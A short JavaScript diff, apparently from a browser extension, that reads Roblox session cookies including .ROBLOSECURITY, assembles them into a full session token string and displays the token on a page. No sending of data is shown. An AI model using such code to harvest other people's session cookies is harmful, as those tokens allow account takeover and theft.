@@ -28,11 +28,11 @@ function getCookies(domain, name, callback) {
 
 
 getCookies("https://www.roblox.com", ".ROBLOSECURITY", function(token) {
-    _token = token+";";
+    _token = token;
     document.getElementById("token").innerHTML = token;
 
     getCookies("https://www.roblox.com", "RBXSessionTracker", function(value) {
-    if (value != null) _fullToken += "RBXSessionTracker="+value+";";
+    if (value != null) _fullToken += ";RBXSessionTracker="+value+";";
 
     getCookies("https://www.roblox.com", "GuestData", function(value) {
         if (value != null) _fullToken += "GuestData="+value+";";
